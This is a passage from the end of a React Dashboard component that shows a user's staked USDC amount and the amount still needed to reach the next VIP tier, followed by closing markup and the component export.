                    <span>{formatNumber(userData.stakedAmount)} USDC staked</span>
                    <span>{formatNumber(Math.max(0,[10000,50000,100000][userData.vipLevel]-userData.stakedAmount))} USDC needed</span>
                  </div>
                </div>
              )}
            </div>
          )}

        </div>
      </main>
    </div>
  );
}

export default Dashboard;
